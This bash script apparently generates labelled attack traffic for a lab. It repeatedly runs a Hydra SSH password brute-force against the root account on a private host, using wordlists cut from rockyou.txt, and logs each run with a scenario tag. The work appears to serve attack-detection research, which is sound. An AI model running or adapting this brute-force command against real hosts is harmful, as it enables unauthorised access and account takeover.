#!/bin/bash
WORDLISTS=(/tmp/wl_small.txt /tmp/wl_medium.txt /tmp/wl_large.txt)
THREADS=(2 4 8)

head -n 50 /usr/share/wordlists/rockyou.txt > /tmp/wl_small.txt
head -n 500 /usr/share/wordlists/rockyou.txt > /tmp/wl_medium.txt
head -n 2000 /usr/share/wordlists/rockyou.txt > /tmp/wl_large.txt

for i in $(seq 1 15); do
    wl=${WORDLISTS[$((RANDOM % 3))]}
    t=${THREADS[$((RANDOM % 3))]}
    echo "=== Rep $i/15 -- wordlist=$wl threads=$t ==="
    python3 06_run_logger.py \
        --scenario BRUTE-01 \
        --class brute_force \
        --cmd "hydra -l root -P $wl -t $t ssh://192.168.10.104" \
        --target 192.168.10.104 \
        --note "rep $i/15, wordlist=$wl, threads=$t"
    sleep 5
done

echo "DONE - 15 reps complete"